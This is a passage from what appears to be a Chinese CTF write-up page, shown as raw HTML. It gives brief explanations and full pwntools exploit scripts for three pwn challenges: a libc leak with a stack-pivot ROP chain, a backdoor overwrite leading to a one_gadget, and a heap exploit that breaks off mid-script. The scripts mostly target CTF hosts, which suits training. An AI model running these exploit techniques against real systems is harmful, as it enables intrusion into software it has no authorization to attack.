punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h2><p>泄露<code>libc</code>地址之后通过<code>environ</code>泄露栈地址，栈迁移到栈前面部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-9c32d4cdb8.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401393</span>start <span class="token operator">=</span> <span class="token number">0x4010B0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3b8</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404500</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> orw_rop<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="QWEN"><a href="#QWEN" class="headerlink" title="QWEN"></a>QWEN</h2><p>当输入的位置越界之后会调用<code>a1</code>，所以先赢了游戏之后覆盖<code>a1</code>为<code>backdoor</code>，可以有限制的读文件，读<code>/proc/self/maps</code>泄露<code>libc</code>地址之后打<code>ogg</code>，直接打会失败，先返回到<code>main</code>重新运行再打<code>ogg</code>平衡栈，远程用<code>pwn2</code>压缩<code>flag</code>直接<code>cat</code>拿到<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-c9c758156e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">game</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 0'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'say?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'game'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'15 15'</span><span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x1508</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6b8b4567</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'logged'</span><span class="token punctuation">,</span> <span class="token string">b'/proc/self/maps'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>start <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x9E0</span>main_addr <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x17B3</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc.so.6'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_basep1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="guest-book"><a href="#guest-book" class="headerlink" title="guest book"></a>guest book</h2><p>直接套<code>large bin</code>的<code>hosue of apple</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-f29b87ed3e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x540</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x530</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x21ace0</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x290</span>_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>_IO_wfile_jumps <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000114723</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a47</span><span class="token punctuation">,</span> <span class="token number">0xebc81</span><span class="token punctuation">,</span> <span class="token number">0xebc85</span><span class="token punctuation">,</span> <span class="token number">0xebc88</span><span class="token punctuation">,</span> <span class="token number">0xebce2</span><span class="token punctuation">,</span> <span class="token number">0xebd3f</span><span class="token punctuation">,</span> <span class="token number">0xebd43</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basedelete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x290</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token 